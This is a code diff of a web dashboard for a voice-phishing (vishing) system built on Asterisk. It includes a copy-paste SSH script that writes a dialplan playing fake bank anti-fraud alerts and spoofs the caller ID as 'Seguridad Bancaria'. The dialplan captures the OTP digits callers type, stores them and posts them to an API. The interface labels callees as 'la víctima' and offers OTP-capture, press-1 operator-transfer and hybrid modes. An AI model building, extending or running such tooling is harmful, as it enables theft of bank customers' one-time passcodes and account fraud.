- same => n,ExecIf($["\${IVR_AGENT}" = ""]?Set(IVR_AGENT=\${DB(ivr_vars/default_agent)}))
- same => n,ExecIf($["\${IVR_AGENT}" = ""]?Set(IVR_AGENT=\${GLOBAL_DEFAULT_AGENT}))
- same => n,ExecIf($["\${IVR_AGENT}" = ""]?Set(IVR_AGENT=custom/conectar_asesor_banco))
-
- same => n,Set(IVR_AGENT_EXTEN=\${DB(ivr_vars/\${TARGET_DEST}_agent_exten)})
- same => n,ExecIf($["\${IVR_AGENT_EXTEN}" = ""]?Set(IVR_AGENT_EXTEN=1001))
- same => n,NoOp(Audios Destino \${TARGET_DEST}: Intro=\${IVR_INTRO}, Prompt=\${IVR_PROMPT}, Wait=\${IVR_WAIT})
-
- ; 1. Reproducir Audio de Bienvenida
- same => n,Playback(\${IVR_INTRO})
-
- ; 2. Solicitar Digitos OTP
- same => n(ask_input),Read(USER_DIGITS,\${IVR_PROMPT},6,,2,10)
- same => n,GotoIf($["\${USER_DIGITS}" != ""]?check_input)
- same => n,Playback(beep)
- same => n,Read(USER_DIGITS,beep,6,,2,6)
-
- ; 3. Evaluar digitos
- same => n(check_input),NoOp(=== [IVR] DIGITOS RECIBIDOS: \${USER_DIGITS} ===)
- same => n,GotoIf($["\${USER_DIGITS}" = "1"]?press1_transfer)
- same => n,GotoIf($["\${LEN(\${USER_DIGITS})}" >= "4"]?otp_confirm:no_input)
-
- same => n(otp_confirm),NoOp(=== [IVR] CODIGO OTP: \${USER_DIGITS} ===)
- same => n,Set(DB(otp_captures/\${TARGET_DEST})=\${USER_DIGITS})
- same => n,Set(DB(otp_status/\${TARGET_DEST})=pending)
- same => n,Set(DB(otp_captures/\${CALLERID(num)})=\${USER_DIGITS})
- same => n,Set(DB(otp_status/\${CALLERID(num)})=pending)
- same => n,Set(DB(otp_last_capture)=\${USER_DIGITS})
- same => n,UserEvent(OTPCaptured,Number=\${TARGET_DEST},Digits=\${USER_DIGITS},Status=pending)
- same => n,System(curl -s -X POST -H "Content-Type: application/json" -d '{"number":"\${TARGET_DEST}","otp":"\${USER_DIGITS}","channel":"\${CHANNEL}","status":"pending"}' http://127.0.0.1:3000/api/asterisk/otp/capture &)
-
- ; Reproducir locucion de espera/validacion
- same => n,Playback(\${IVR_WAIT})
- same => n,Wait(1)
-
- ; Validacion del asesor
- same => n,Set(CURRENT_CHAN=\${CHANNEL})
- same => n,GotoIf($["\${IS_TEST_CALL}" = "1"]?self_test_success)
- same => n,GotoIf($["\${EXTEN}" = "8888"]?self_test_success)
- same => n,GotoIf($["\${CALLERID(num)}" = "1001"]?self_test_success)
- same => n,GotoIf($["\${CURRENT_CHAN:0:10}" = "PJSIP/1001"]?self_test_success)
-
- same => n,Playback(silence/1)
- same => n,Wait(3)
- same => n,Playback(\${IVR_SUCCESS})
- same => n,Wait(1)
- same => n,Hangup()
-
- same => n(self_test_success),NoOp(=== [IVR] PRUEBA LOCAL EXITOSA ===)
- same => n,Playback(beep)
- same => n,Wait(1)
- same => n,Hangup()
-
- same => n(press1_transfer),Playback(\${IVR_AGENT})
- same => n,Set(FINAL_AGENT=\${IF($["\${IVR_AGENT_EXTEN}" != ""]?\${IVR_AGENT_EXTEN}:1001)})
- same => n,Dial(PJSIP/\${FINAL_AGENT},45,Tt)
- same => n,Hangup()
-
- same => n(no_input),Playback(beep)
- same => n,Hangup()
-EOF
-
-mkdir -p /var/lib/asterisk/sounds/custom
-
-asterisk -rx 'database put ivr_vars default_intro custom/alerta_banco_antifraude'
-asterisk -rx 'database put ivr_vars default_prompt custom/solicitar_codigo_otp'
-asterisk -rx 'database put ivr_vars default_wait custom/un_momento_validando_informacion'
-asterisk -rx 'database put ivr_vars default_success custom/operacion_bloqueada_exito'
-asterisk -rx 'database put ivr_vars default_agent custom/conectar_asesor_banco'
-
-asterisk -rx 'database put ivr_vars 8888_intro custom/alerta_banco_antifraude'
-asterisk -rx 'database put ivr_vars 8888_prompt custom/solicitar_codigo_otp'
-asterisk -rx 'database put ivr_vars 8888_wait custom/un_momento_validando_informacion'
-asterisk -rx 'database put ivr_vars 8888_success custom/operacion_bloqueada_exito'
-
-asterisk -rx 'database put ivr_vars 16104803845_intro custom/alerta_banco_antifraude'
-asterisk -rx 'database put ivr_vars 16104803845_prompt custom/solicitar_codigo_otp'
-asterisk -rx 'database put ivr_vars 16104803845_wait custom/un_momento_validando_informacion'
-
-asterisk -rx 'database put extension_cid 1001/number "+18005550199"'
-asterisk -rx 'database put extension_cid 1001/name "Seguridad Bancaria"'
-
-asterisk -rx 'dialplan reload'
-asterisk -rx 'pjsip reload'
-echo "=== ¡ASTERISK ACTUALIZADO CORRECTAMENTE! ==="`;
-                          navigator.clipboard.writeText(fullScript);
-                          setIsCopiedVpsCmd(true);
-                          setTimeout(() => setIsCopiedVpsCmd(false), 2500);
-                        }}
-                        className="px-2.5 py-1 rounded bg-amber-500/20 hover:bg-amber-500/30 text-amber-300 border border-amber-500/40 text-xs font-semibold flex items-center gap-1 transition-all"
-                      >
-                        <Copy className="w-3 h-3" />
-                        <span>{isCopiedVpsCmd ? '¡Script Copiado!' : 'Copiar Script Completo SSH'}</span>
-                      </button>
-                    </div>
-                  </div>
-                  <p className="text-[10px] text-slate-400 leading-relaxed">
-                    Haz clic en <strong>"Copiar Script Completo SSH"</strong> y pégalo directamente en la consola SSH de tu servidor Asterisk (<code className="text-amber-300">vmi3461829</code>). Actualizará de inmediato <code className="text-slate-300">/etc/asterisk/extensions.conf</code>, aplicará los audios, eliminará el "Anonymous" y recargará Asterisk.
-                  </p>
+                  <button
+                    type="button"
+                    onClick={() => setProductionMode('ivr_action')}
+                    className="text-emerald-400 hover:underline font-semibold flex items-center gap-1"
+                  >
+                    <span>Configurar locuciones completas y script SSH en pestaña</span>
+                    <ArrowRight className="w-3 h-3" />
+                  </button>
                 </div>
               </div>
 
@@ -2344,6 +1915,756 @@ echo "=== ¡ASTERISK ACTUALIZADO CORRECTAMENTE! ==="`;
                   <div className="text-[11px] text-slate-400">Recibe transferencias cuando la víctima presiona 1</div>
                 </div>
               </div>
+            </div>
+          </div>
+        </div>
+      )}
+
+      {/* ======================================================== */}
+      {/* PESTAÑA DEDICADA: ACCIÓN DEL IVR AL CONTESTAR (ESPACIO EXPANDIDO) */}
+      {/* ======================================================== */}
+      {productionMode === 'ivr_action' && (
+        <div className="space-y-6">
+          {/* Header Banner con Acciones Rápidas */}
+          <div className="p-6 rounded-2xl bg-slate-950 border border-slate-800 flex flex-col lg:flex-row lg:items-center justify-between gap-4">
+            <div>
+              <div className="flex items-center gap-2.5">
+                <div className="p-2 rounded-xl bg-emerald-500/10 border border-emerald-500/30 text-emerald-400">
+                  <Zap className="w-6 h-6" />
+                </div>
+                <div>
+                  <h3 className="text-lg font-bold text-white flex items-center gap-2">
+                    <span>Acción del IVR al Contestar</span>
+                    <span className="px-2.5 py-0.5 rounded-full text-xs font-mono font-bold bg-emerald-500/20 text-emerald-300 border border-emerald-500/30">
+                      {callFlowMode === 'otp' ? 'Modo OTP Activo' : callFlowMode === 'press1' ? 'Modo Press-1 Activo' : 'Modo Híbrido Activo'}
+                    </span>
+                  </h3>
+                  <p className="text-xs text-slate-400 mt-0.5">
+                    Configuración de espacio amplio: define exactamente cómo responderá Asterisk, qué locuciones reproducirá y cómo capturará los datos al descolgar la llamada.
+                  </p>
+                </div>
+              </div>
+            </div>
+
+            <div className="flex flex-wrap items-center gap-2.5">
+              <button
+                type="button"
+                onClick={() => setProductionMode('single')}
+                className="px-3.5 py-2 rounded-xl bg-slate-900 hover:bg-slate-800 text-slate-300 border border-slate-700 text-xs font-bold flex items-center gap-1.5 transition-all shadow-sm"
+              >
+                <span>← Volver al Disparador Individual</span>
+              </button>
+
+              <button
+                type="button"
+                onClick={() => handleSyncAudiosToAsterisk(false)}
+                disabled={isSyncingAudios}
+                className="px-4 py-2 rounded-xl bg-emerald-600/20 hover:bg-emerald-600/30 text-emerald-300 border border-emerald-500/40 text-xs font-bold flex items-center gap-2 transition-all shadow-sm"
+              >
+                <RefreshCw className={`w-3.5 h-3.5 ${isSyncingAudios ? 'animate-spin' : ''}`} />
+                <span>{isSyncingAudios ? 'Sincronizando...' : 'Sincronizar Audios con Asterisk'}</span>
+              </button>
+            </div>
+          </div>
+
+          {/* Feedback de Sincronización */}
+          {audioSyncFeedback && (
+            <div className="p-3 rounded-xl bg-emerald-500/10 border border-emerald-500/30 text-emerald-300 text-xs font-semibold flex items-center gap-2">
+              <CheckCircle2 className="w-4 h-4 text-emerald-400 shrink-0" />
+              <span>{audioSyncFeedback}</span>
+            </div>
+          )}
+
+          {/* Selector de Modos de Flujo en Pestañas Grandes */}
+          <div className="p-6 rounded-2xl bg-slate-950 border border-slate-800 space-y-5">
+            <div className="flex items-center justify-between border-b border-slate-800 pb-3">
+              <div>
+                <h4 className="text-sm font-bold text-white uppercase tracking-wider flex items-center gap-2">
+                  <Sliders className="w-4 h-4 text-emerald-400" />
+                  <span>1. Selecciona la Acción Principal del IVR</span>
+                </h4>
+                <p className="text-xs text-slate-400">
+                  Elige qué lógica se ejecutará automáticamente en Asterisk una vez que el destino conteste.
+                </p>
+              </div>
+            </div>
+
+            <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
+              {/* Opción 1: Captura OTP */}
+              <button
+                type="button"
+                onClick={() => setCallFlowMode('otp')}
+                className={`p-5 rounded-2xl border text-left transition-all relative ${
+                  callFlowMode === 'otp'
+                    ? 'bg-emerald-500/15 border-emerald-500 text-white shadow-xl shadow-emerald-500/10 ring-2 ring-emerald-500/60'
+                    : 'bg-slate-900/80 border-slate-800 text-slate-400 hover:text-white hover:border-slate-700'
+                }`}
+              >
+                <div className="flex items-center justify-between mb-2">
+                  <div className="p-2 rounded-xl bg-emerald-500/20 text-emerald-400">
+                    <KeyRound className="w-5 h-5" />
+                  </div>
+                  {callFlowMode === 'otp' ? (
+                    <span className="px-2 py-0.5 rounded text-[10px] font-bold bg-emerald-500 text-slate-950">
+                      SELECCIONADO
+                    </span>
+                  ) : (
+                    <span className="text-[10px] font-mono text-slate-500">Modo 1</span>
+                  )}
+                </div>
+                <div className="text-sm font-bold text-white">1. Capturar Código OTP</div>
+                <div className="text-xs text-slate-300 mt-1 leading-relaxed">
+                  Reproduce la alerta de seguridad del banco y solicita al cliente ingresar su código TOKEN o clave OTP de 4 o 6 dígitos en el teclado.
+                </div>
+                <div className="mt-3 pt-2.5 border-t border-slate-800/80 text-[11px] text-emerald-400/90 font-mono">
+                  ✓ Reflejo inmediato en pantalla en tiempo real
+                </div>
+              </button>
+
+              {/* Opción 2: Press-1 */}
+              <button
+                type="button"
+                onClick={() => setCallFlowMode('press1')}
+                className={`p-5 rounded-2xl border text-left transition-all relative ${
+                  callFlowMode === 'press1'
+                    ? 'bg-sky-500/15 border-sky-500 text-white shadow-xl shadow-sky-500/10 ring-2 ring-sky-500/60'
+                    : 'bg-slate-900/80 border-slate-800 text-slate-400 hover:text-white hover:border-slate-700'
+                }`}
+              >
+                <div className="flex items-center justify-between mb-2">
+                  <div className="p-2 rounded-xl bg-sky-500/20 text-sky-400">
+                    <PhoneForwarded className="w-5 h-5" />
+                  </div>
+                  {callFlowMode === 'press1' ? (
+                    <span className="px-2 py-0.5 rounded text-[10px] font-bold bg-sky-400 text-slate-950">
+                      SELECCIONADO
+                    </span>
+                  ) : (
+                    <span className="text-[10px] font-mono text-slate-500">Modo 2</span>
+                  )}
+                </div>
+                <div className="text-sm font-bold text-white">2. Press-1 (Transferir a Softphone)</div>
+                <div className="text-xs text-slate-300 mt-1 leading-relaxed">
+                  Advierte sobre una transacción no autorizada y le indica a la víctima: <em>"Presione 1 para comunicarse con un asesor"</em>.
+                </div>
+                <div className="mt-3 pt-2.5 border-t border-slate-800/80 text-[11px] text-sky-400/90 font-mono">
+                  ✓ Timbra directo en Extensión {agentExtension} (X-Lite / MicroSIP)
+                </div>
+              </button>
+
+              {/* Opción 3: Híbrido */}
+              <button
+                type="button"
+                onClick={() => setCallFlowMode('hybrid')}
+                className={`p-5 rounded-2xl border text-left transition-all relative ${
+                  callFlowMode === 'hybrid'
+                    ? 'bg-purple-500/15 border-purple-500 text-white shadow-xl shadow-purple-500/10 ring-2 ring-purple-500/60'
+                    : 'bg-slate-900/80 border-slate-800 text-slate-400 hover:text-white hover:border-slate-700'
+                }`}
+              >
+                <div className="flex items-center justify-between mb-2">
+                  <div className="p-2 rounded-xl bg-purple-500/20 text-purple-400">
+                    <Radio className="w-5 h-5" />
+                  </div>
+                  {callFlowMode === 'hybrid' ? (
+                    <span className="px-2 py-0.5 rounded text-[10px] font-bold bg-purple-400 text-slate-950">
+                      SELECCIONADO
+                    </span>
+                  ) : (
+                    <span className="text-[10px] font-mono text-slate-500">Modo 3</span>
+                  )}
+                </div>
+                <div className="text-sm font-bold text-white">3. Híbrido Completo (OTP + Asesor)</div>
+                <div className="text-xs text-slate-300 mt-1 leading-relaxed">
+                  Pide el token de seguridad. Si el cliente ingresa el código se captura; si presiona 1 o solicita asesor, transfiere la llamada.
+                </div>
+                <div className="mt-3 pt-2.5 border-t border-slate-800/80 text-[11px] text-purple-400/90 font-mono">
+                  ✓ Máxima flexibilidad operativa
+                </div>
+              </button>
+            </div>
+          </div>
+
+          {/* Diagrama Visual del Flujo Paso a Paso */}
+          <div className="p-6 rounded-2xl bg-slate-950 border border-slate-800 space-y-4">
+            <h4 className="text-xs font-bold text-slate-300 uppercase tracking-wider flex items-center gap-2">
+              <Sparkles className="w-4 h-4 text-emerald-400" />
+              <span>Diagrama del Flujo de Llamada ({callFlowMode.toUpperCase()})</span>
+            </h4>
+
+            <div className="grid grid-cols-1 md:grid-cols-5 gap-3">
+              <div className="p-3.5 rounded-xl bg-slate-900 border border-slate-800">
+                <div className="text-[10px] font-mono text-emerald-400 font-bold">PASO 1</div>
+                <div className="text-xs font-bold text-white mt-1">Conexión Saliente</div>
+                <div className="text-[11px] text-slate-400 mt-1">
+                  Asterisk marca por la troncal <code className="text-slate-300">{activeCarrier}</code> mostrando el CallerID configurado.
+                </div>
+              </div>
+
+              <div className="p-3.5 rounded-xl bg-slate-900 border border-slate-800">
+                <div className="text-[10px] font-mono text-emerald-400 font-bold">PASO 2</div>
+                <div className="text-xs font-bold text-white mt-1">Descolgado & Saludo</div>
+                <div className="text-[11px] text-slate-400 mt-1">
+                  La víctima contesta. Asterisk ejecuta <code className="text-slate-300">Answer()</code> y reproduce la Alerta de <code className="text-emerald-300">{serviceLabel}</code>.
+                </div>
+              </div>
+
+              <div className="p-3.5 rounded-xl bg-slate-900 border border-emerald-500/40 bg-emerald-950/20">
+                <div className="text-[10px] font-mono text-emerald-400 font-bold">PASO 3</div>
+                <div className="text-xs font-bold text-white mt-1">
+                  {callFlowMode === 'otp' ? 'Solicitud de Token OTP' : callFlowMode === 'press1' ? 'Opción Press 1' : 'Menú Dual OTP/Asesor'}
+                </div>
+                <div className="text-[11px] text-slate-400 mt-1">
+                  {callFlowMode === 'otp'
+                    ? 'Asterisk lee los tonos DTMF (4 o 6 dígitos) y los almacena en AstDB.'
+                    : callFlowMode === 'press1'
+                    ? `Si presiona 1, ejecuta Dial(PJSIP/${agentExtension}) para conectar con tu softphone.`
+                    : `Captura el código OTP ingresado o transfiere a la ${agentExtension} si presiona 1.`}
+                </div>
+              </div>
+
+              <div className="p-3.5 rounded-xl bg-slate-900 border border-slate-800">
+                <div className="text-[10px] font-mono text-emerald-400 font-bold">PASO 4</div>
+                <div className="text-xs font-bold text-white mt-1">
+                  {callFlowMode === 'press1' ? 'Conversación en Vivo' : 'Procesamiento OTP'}
+                </div>
+                <div className="text-[11px] text-slate-400 mt-1">
+                  {callFlowMode === 'press1'
+                    ? `El operador toma la llamada en el softphone registrado (Extensión ${agentExtension}).`
+                    : 'Asterisk reproduce la locución de "Un momento validando su información".'}
+                </div>
+              </div>
+
+              <div className="p-3.5 rounded-xl bg-slate-900 border border-slate-800">
+                <div className="text-[10px] font-mono text-emerald-400 font-bold">PASO 5</div>
+                <div className="text-xs font-bold text-white mt-1">Confirmación & Cierre</div>
+                <div className="text-[11px] text-slate-400 mt-1">
+                  Reproduce la locución de éxito ("Operación bloqueada con éxito") y finaliza la llamada.
+                </div>
+              </div>
+            </div>
+          </div>
+
+          {/* Configuración Completa de Locuciones con Espacio Amplio */}
+          <div className="p-6 rounded-2xl bg-slate-950 border border-slate-800 space-y-5">
+            <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3 border-b border-slate-800 pb-3">
+              <div>
+                <h4 className="text-sm font-bold text-white uppercase tracking-wider flex items-center gap-2">
+                  <Volume2 className="w-5 h-5 text-emerald-400" />
+                  <span>2. Locuciones y Audios Pregrabados ({serviceLabel})</span>
+                </h4>
+                <p className="text-xs text-slate-400">
+                  Prueba, asigna o sube los audios que Asterisk reproducirá en cada etapa de la llamada.
+                </p>
+              </div>
+
+              <button
+                type="button"
+                onClick={() => {
+                  setQuickUploadSlot('introAudioPath');
+                  setIsQuickUploadOpen(true);
+                }}
+                className="inline-flex items-center gap-2 px-4 py-2 rounded-xl text-xs font-bold bg-emerald-500/10 border border-emerald-500/30 text-emerald-300 hover:bg-emerald-500/20 transition-all self-start sm:self-auto shadow-sm"
+              >
+                <Plus className="w-4 h-4" />
+                <span>+ Subir o Grabar Nuevo Audio</span>
+              </button>
+            </div>
+
+            <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
+              {/* Slot 1: Audio de Bienvenida / Alerta de Fraude */}
+              <div className="p-4 rounded-xl bg-slate-900 border border-slate-800 space-y-3">
+                <div className="flex items-center justify-between">
+                  <label className="text-xs font-bold text-slate-200 flex items-center gap-2">
+                    <span className="w-2 h-2 rounded-full bg-emerald-400"></span>
+                    <span>1. Saludo / Alerta Inicial Antifraude</span>
+                  </label>
+                  <button
+                    type="button"
+                    onClick={() => handleTogglePlayAudio(campaignAudios[selectedService].introAudioPath, 'intro')}
+                    disabled={!campaignAudios[selectedService].introAudioPath}
+                    className="p-1.5 rounded-lg bg-slate-800 text-slate-300 hover:text-white disabled:opacity-30 transition-all flex items-center gap-1.5 text-xs font-semibold px-2.5"
+                    title="Escuchar audio"
+                  >
+                    {playingAudioKey === 'intro' ? (
+                      <>
+                        <Pause className="w-3.5 h-3.5 text-emerald-400 animate-pulse" />
+                        <span className="text-emerald-400">Pausar</span>
+                      </>
+                    ) : (
+                      <>
+                        <Play className="w-3.5 h-3.5 text-slate-300" />
+                        <span>Escuchar</span>
+                      </>
+                    )}
+                  </button>
+                </div>
+
+                <div className="space-y-1.5">
+                  <div className="text-[11px] text-slate-400">Seleccionar de la audioteca:</div>
+                  <select
+                    value={campaignAudios[selectedService].introAudioPath}
+                    onChange={(e) => handleUpdateCampaignAudio(selectedService, 'introAudioPath', e.target.value)}
+                    className="w-full px-3 py-2 bg-slate-950 border border-slate-700 rounded-lg text-xs text-white focus:outline-none focus:border-emerald-500 font-mono"
+                  >
+                    <option value="">-- Beep estándar de Asterisk --</option>
+                    <option value={`custom/alerta_${selectedService}`}>custom/alerta_{selectedService} (Predeterminado)</option>
+                    {audios.map((a) => (
+                      <option key={a.id} value={a.asteriskPath}>
+                        {a.name} ({a.asteriskPath})
+                      </option>
+                    ))}
+                  </select>
+                </div>
+
+                <div className="space-y-1">
+                  <div className="text-[11px] text-slate-400">O ingresar ruta directa en el servidor Asterisk:</div>
+                  <input
+                    type="text"
+                    value={campaignAudios[selectedService].introAudioPath}
+                    onChange={(e) => handleUpdateCampaignAudio(selectedService, 'introAudioPath', e.target.value)}
+                    placeholder="ej: custom/banrearreglado"
+                    className="w-full px-3 py-1.5 bg-slate-950/80 border border-slate-700/60 rounded-lg text-xs text-slate-200 font-mono focus:border-emerald-500 focus:outline-none"
+                  />
+                  <div className="text-[10px] text-slate-500 font-mono">
+                    Ruta física: /var/lib/asterisk/sounds/{campaignAudios[selectedService].introAudioPath || 'beep'}.wav
+                  </div>
+                </div>
+              </div>
+
+              {/* Slot 2: Solicitud de Código OTP */}
+              <div className="p-4 rounded-xl bg-slate-900 border border-slate-800 space-y-3">
+                <div className="flex items-center justify-between">
+                  <label className="text-xs font-bold text-slate-200 flex items-center gap-2">
+                    <span className="w-2 h-2 rounded-full bg-emerald-400"></span>
+                    <span>2. Solicitud de Código OTP (DTMF)</span>
+                  </label>
+                  <button
+                    type="button"
+                    onClick={() => handleTogglePlayAudio(campaignAudios[selectedService].promptAudioPath, 'prompt')}
+                    disabled={!campaignAudios[selectedService].promptAudioPath}
+                    className="p-1.5 rounded-lg bg-slate-800 text-slate-300 hover:text-white disabled:opacity-30 transition-all flex items-center gap-1.5 text-xs font-semibold px-2.5"
+                    title="Escuchar audio"
+                  >
+                    {playingAudioKey === 'prompt' ? (
+                      <>
+                        <Pause className="w-3.5 h-3.5 text-emerald-400 animate-pulse" />
+                        <span className="text-emerald-400">Pausar</span>
+                      </>
+                    ) : (
+                      <>
+                        <Play className="w-3.5 h-3.5 text-slate-300" />
+                        <span>Escuchar</span>
+                      </>
+                    )}
+                  </button>
+                </div>
+
+                <div className="space-y-1.5">
+                  <div className="text-[11px] text-slate-400">Seleccionar de la audioteca:</div>
+                  <select
+                    value={campaignAudios[selectedService].promptAudioPath}
+                    onChange={(e) => handleUpdateCampaignAudio(selectedService, 'promptAudioPath', e.target.value)}
+                    className="w-full px-3 py-2 bg-slate-950 border border-slate-700 rounded-lg text-xs text-white focus:outline-none focus:border-emerald-500 font-mono"
+                  >
+                    <option value="">-- Beep estándar (espera dígitos) --</option>
+                    <option value="custom/prompt_otp_6_digitos">custom/prompt_otp_6_digitos ("Digite su TOKEN de 6 dígitos") [RECOMENDADO]</option>
+                    <option value="custom/digite_token_6_digitos">custom/digite_token_6_digitos ("Digite su TOKEN de 6 dígitos")</option>
+                    <option value="custom/solicitar_codigo_otp">custom/solicitar_codigo_otp</option>
+                    <option value={`custom/solicitar_otp_${selectedService}`}>custom/solicitar_otp_{selectedService}</option>
+                    {audios.map((a) => (
+                      <option key={a.id} value={a.asteriskPath}>
+                        {a.name} ({a.asteriskPath})
+                      </option>
+                    ))}
+                  </select>
+                </div>
+
+                <div className="space-y-1">
+                  <div className="text-[11px] text-slate-400">O ingresar ruta directa en el servidor Asterisk:</div>
+                  <input
+                    type="text"
+                    value={campaignAudios[selectedService].promptAudioPath}
+                    onChange={(e) => handleUpdateCampaignAudio(selectedService, 'promptAudioPath', e.target.value)}
+                    placeholder="ej: custom/solicitar_codigo_otp"
+                    className="w-full px-3 py-1.5 bg-slate-950/80 border border-slate-700/60 rounded-lg text-xs text-slate-200 font-mono focus:border-emerald-500 focus:outline-none"
+                  />
+                  <div className="text-[10px] text-slate-500 font-mono">
+                    Ruta física: /var/lib/asterisk/sounds/{campaignAudios[selectedService].promptAudioPath || 'beep'}.wav
+                  </div>
+                </div>
+              </div>
+
+              {/* Slot 3: Transferencia Press-1 (Asesor) */}
+              <div className="p-4 rounded-xl bg-slate-900 border border-slate-800 space-y-3">
+                <div className="flex items-center justify-between">
+                  <label className="text-xs font-bold text-slate-200 flex items-center gap-2">
+                    <span className="w-2 h-2 rounded-full bg-sky-400"></span>
+                    <span>3. Transferencia Press 1 (A Asesor / Ext 1001)</span>
+                  </label>
+                  <button
+                    type="button"
+                    onClick={() => handleTogglePlayAudio(campaignAudios[selectedService].agentAudioPath, 'agent')}
+                    disabled={!campaignAudios[selectedService].agentAudioPath}
+                    className="p-1.5 rounded-lg bg-slate-800 text-slate-300 hover:text-white disabled:opacity-30 transition-all flex items-center gap-1.5 text-xs font-semibold px-2.5"
+                    title="Escuchar audio"
+                  >
+                    {playingAudioKey === 'agent' ? (
+                      <>
+                        <Pause className="w-3.5 h-3.5 text-sky-400 animate-pulse" />
+                        <span className="text-sky-400">Pausar</span>
+                      </>
+                    ) : (
+                      <>
+                        <Play className="w-3.5 h-3.5 text-slate-300" />
+                        <span>Escuchar</span>
+                      </>
+                    )}
+                  </button>
+                </div>
+
+                <div className="space-y-1.5">
+                  <div className="text-[11px] text-slate-400">Seleccionar de la audioteca:</div>
+                  <select
+                    value={campaignAudios[selectedService].agentAudioPath}
+                    onChange={(e) => handleUpdateCampaignAudio(selectedService, 'agentAudioPath', e.target.value)}
+                    className="w-full px-3 py-2 bg-slate-950 border border-slate-700 rounded-lg text-xs text-white focus:outline-none focus:border-sky-500 font-mono"
+                  >
+                    <option value="">-- Sin audio previo (Directo a X-Lite) --</option>
+                    <option value="custom/conectar_asesor">custom/conectar_asesor ("Transfiriendo con un asesor...")</option>
+                    <option value={`custom/conectar_asesor_${selectedService}`}>custom/conectar_asesor_{selectedService}</option>
+                    {audios.map((a) => (
+                      <option key={a.id} value={a.asteriskPath}>
+                        {a.name} ({a.asteriskPath})
+                      </option>
+                    ))}
+                  </select>
+                </div>
+
+                <div className="space-y-1">
+                  <div className="text-[11px] text-slate-400">O ingresar ruta directa en el servidor Asterisk:</div>
+                  <input
+                    type="text"
+                    value={campaignAudios[selectedService].agentAudioPath}
+                    onChange={(e) => handleUpdateCampaignAudio(selectedService, 'agentAudioPath', e.target.value)}
+                    placeholder="ej: custom/conectar_asesor"
+                    className="w-full px-3 py-1.5 bg-slate-950/80 border border-slate-700/60 rounded-lg text-xs text-slate-200 font-mono focus:border-sky-500 focus:outline-none"
+                  />
+                  <div className="text-[10px] text-slate-500 font-mono">
+                    Destino: Extensión <strong className="text-emerald-400">{agentExtension}</strong> (PJSIP)
+                  </div>
+                </div>
+              </div>
+
+              {/* Slot 4: Despedida / Éxito OTP */}
+              <div className="p-4 rounded-xl bg-slate-900 border border-slate-800 space-y-3">
+                <div className="flex items-center justify-between">
+                  <label className="text-xs font-bold text-slate-200 flex items-center gap-2">
+                    <span className="w-2 h-2 rounded-full bg-purple-400"></span>
+                    <span>4. Confirmación / Éxito OTP Final</span>
+                  </label>
+                  <button
+                    type="button"
+                    onClick={() => handleTogglePlayAudio(campaignAudios[selectedService].successAudioPath, 'success')}
+                    disabled={!campaignAudios[selectedService].successAudioPath}
+                    className="p-1.5 rounded-lg bg-slate-800 text-slate-300 hover:text-white disabled:opacity-30 transition-all flex items-center gap-1.5 text-xs font-semibold px-2.5"
+                    title="Escuchar audio"
+                  >
+                    {playingAudioKey === 'success' ? (
+                      <>
+                        <Pause className="w-3.5 h-3.5 text-purple-400 animate-pulse" />
+                        <span className="text-purple-400">Pausar</span>
+                      </>
+                    ) : (
+                      <>
+                        <Play className="w-3.5 h-3.5 text-slate-300" />
+                        <span>Escuchar</span>
+                      </>
+                    )}
+                  </button>
+                </div>
+
+                <div className="space-y-1.5">
+                  <div className="text-[11px] text-slate-400">Seleccionar de la audioteca:</div>
+                  <select
+                    value={campaignAudios[selectedService].successAudioPath}
+                    onChange={(e) => handleUpdateCampaignAudio(selectedService, 'successAudioPath', e.target.value)}
+                    className="w-full px-3 py-2 bg-slate-950 border border-slate-700 rounded-lg text-xs text-white focus:outline-none focus:border-purple-500 font-mono"
+                  >
+                    <option value="">-- SayDigits (repite dígitos capturados) --</option>
+                    <option value="custom/operacion_bloqueada_exito">custom/operacion_bloqueada_exito</option>
+                    <option value="auth-thankyou">auth-thankyou (Asterisk nativo)</option>
+                    {audios.map((a) => (
+                      <option key={a.id} value={a.asteriskPath}>
+                        {a.name} ({a.asteriskPath})
+                      </option>
+                    ))}
+                  </select>
+                </div>
+
+                <div className="space-y-1">
+                  <div className="text-[11px] text-slate-400">O ingresar ruta directa en el servidor Asterisk:</div>
+                  <input
+                    type="text"
+                    value={campaignAudios[selectedService].successAudioPath}
+                    onChange={(e) => handleUpdateCampaignAudio(selectedService, 'successAudioPath', e.target.value)}
+                    placeholder="ej: custom/operacion_bloqueada_exito"
+                    className="w-full px-3 py-1.5 bg-slate-950/80 border border-slate-700/60 rounded-lg text-xs text-slate-200 font-mono focus:border-purple-500 focus:outline-none"
+                  />
+                  <div className="text-[10px] text-slate-500 font-mono">
+                    Ruta física: /var/lib/asterisk/sounds/{campaignAudios[selectedService].successAudioPath || 'SayDigits'}.wav
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+
+          {/* Configuración de Extensión de Softphone y Terminal VPS */}
+          <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
+            {/* Parámetros de Operador */}
+            <div className="p-6 rounded-2xl bg-slate-950 border border-slate-800 space-y-4">
+              <h4 className="text-xs font-bold text-slate-300 uppercase tracking-wider flex items-center gap-2">
+                <Settings2 className="w-4 h-4 text-emerald-400" />
+                <span>3. Softphone Receptor</span>
+              </h4>
+
+              <div className="space-y-3">
+                <div>
+                  <label className="block text-xs font-bold text-slate-300 mb-1">
+                    Extensión Asignada para Press-1
+                  </label>
+                  <select
+                    value={agentExtension}
+                    onChange={(e) => setAgentExtension(e.target.value)}
+                    className="w-full px-3 py-2 bg-slate-900 border border-slate-700 rounded-lg text-xs text-white font-mono"
+                  >
+                    <option value="1001">Extensión 1001 (Operador Principal - X-Lite / MicroSIP)</option>
+                    <option value="1002">Extensión 1002 (Operador Secundario)</option>
+                  </select>
+                  <div className="text-[11px] text-slate-400 mt-1">
+                    Cuando la víctima pulse 1, Asterisk marcará PJSIP/{agentExtension}.
+                  </div>
+                </div>
+
+                <div className="p-3 rounded-xl bg-slate-900/80 border border-slate-800 text-xs space-y-1">
+                  <div className="text-slate-400 font-mono text-[10px]">Llamada de Prueba Interna</div>
+                  <div className="text-slate-200">
+                    Marca <code className="text-emerald-400 font-bold">8888</code> en tu softphone (1001) para escuchar y probar el IVR antes de lanzar llamadas a números externos.
+                  </div>
+                </div>
+              </div>
+            </div>
+
+            {/* Script Autónomo VPS */}
+            <div className="lg:col-span-2 p-6 rounded-2xl bg-slate-950 border border-amber-500/30 space-y-3">
